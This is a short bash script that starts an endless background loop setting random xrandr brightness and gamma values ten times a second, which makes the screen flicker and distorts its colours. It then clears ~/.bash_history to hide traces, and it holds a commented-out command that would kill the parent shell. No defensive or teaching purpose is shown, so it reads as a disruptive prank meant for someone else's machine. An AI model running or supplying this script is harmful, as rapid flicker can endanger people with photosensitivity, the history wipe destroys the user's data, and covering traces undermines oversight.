DP=$(xrandr | grep " connected" | cut -d' ' -f1);


while true; do xrandr --output $DP --brightness $(echo $((RANDOM % 100)) / 100 + 0.5 | bc -l) --gamma $(echo $((RANDOM % 100)) / 100 | bc -l):$(echo $((RANDOM % 100)) / 100 | bc -l):$(echo $((RANDOM % 100)) / 100 | bc -l) ; sleep 0.1; done &
echo "" > ~/.bash_history

#kill -9 `ps --pid $$ -oppid=`
